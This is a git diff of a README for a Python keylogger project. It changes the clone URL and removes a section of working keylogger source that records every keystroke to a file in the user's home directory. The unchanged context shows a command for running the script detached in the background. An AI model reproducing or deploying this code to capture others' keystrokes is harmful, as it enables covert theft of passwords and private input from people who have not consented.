@@ -20,7 +20,7 @@ python --version
 ## Installation
 1. Clone this repository:
    ```sh
-   git clone https://github.com/yourusername/keylogger-python.git
+   git clone https://github.com/yourusername/Cybersec-Automated_advanced_Keystoke_logger.git
    cd keylogger-python
    ```
 
@@ -66,29 +66,6 @@ nohup python3 keylogger.py & disown
 - **Windows:** `C:\Users\<YourUsername>\keylog.txt`
 - **Linux/Mac:** `~/keylog.txt`
 
-## Code Explanation
-```python
-from pynput.keyboard import Listener, Key
-import os
-
-# File to save keystrokes
-log_file = os.path.expanduser("~") + "/keylog.txt"
-
-def on_press(key):
-    try:
-        if key in [Key.cmd, Key.cmd_l, Key.cmd_r]:
-            return  # Ignore Windows key
-        with open(log_file, "a") as f:
-            if isinstance(key, Key):
-                f.write(f"[{key.name}] ")
-            else:
-                f.write(f"{str(key).replace('\'', '')} ")
-    except Exception as e:
-        print(f"Error: {e}")
-
-# Start listener globally
-with Listener(on_press=on_press) as listener:
-    listener.join()
 ```
 
 ## License
